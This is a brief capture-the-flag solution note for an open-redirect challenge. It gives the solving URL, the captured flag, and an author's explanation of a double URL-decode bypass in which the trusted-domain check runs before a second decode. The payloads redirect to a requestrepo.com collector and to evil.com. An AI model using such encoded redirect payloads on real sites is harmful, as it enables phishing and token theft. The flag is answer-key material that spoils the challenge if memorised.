# my note

## exploit
https://8bead17a53a1.pwnbox-lab.com/?go=https://6i19xxqm.requestrepo.com%255C@a.pwnbox-lab.com

## flag
pwnbox{4fe4b29e884612739a07715d84818bf8}


# Author's Note
@Muntrive
Double URL-decode. The host is checked once-decoded — evil.com%23x.pwnbox-lab.com still ends with the trusted domain, so it passes — then decoded AGAIN before the redirect (%2523->%23->#) giving evil.com#… = real host evil.com. The second decode runs AFTER the check; that gap is the bug. ?go=https://evil.com%2523x.pwnbox-lab.com.

